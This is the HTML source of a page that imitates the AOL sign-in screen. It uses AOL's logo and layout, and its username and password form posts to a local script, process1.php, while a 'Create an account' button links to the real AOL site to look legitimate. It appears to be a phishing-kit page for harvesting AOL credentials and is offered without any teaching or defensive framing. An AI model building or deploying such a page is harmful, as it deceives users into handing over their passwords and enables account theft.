 
<html>

	<head>
		<title>AOL - login</title>
		<link rel="icon" href="imgs/favicon.ico" type="image/x-icon"/>
		<link rel="shortcut icon" href="imgs/favicon.ico" type="image/x-icon"/>		
		<link rel="stylesheet" type="text/css" href="style/default.css">
		<link rel="stylesheet" type="text/css" href="style/style.css">		
	</head>
	
	<body>
		<div class="header">
			<img src="imgs/logo.png" width="100px" id="logo">
			
		</div>
		
		<div class="main-img">		
			<img src="imgs/aol-bg.jpg">
		</div>
		<div class="login-box">
			<img src="imgs/logo.png" width="100px">
			<p class="signIn">Sign in</p>
			
			<form method="post" action="process1.php">
				<input type="text" class="input" name="username" placeholder="Username or Email" required><br />
				<input type="password" class="input" name="pass" placeholder="Password" required><br />
				<input type="submit" id="send" value="Sign In">
				<p class="resets">Stay signed in</p><p class="resets forgot">Forgot password?</p>
				<button onclick="window.location.href = 'https://login.aol.com/account/create?specId=yidReg';">Create an account</button>
			</form>
		</div>
		
	
	</body>


</html>

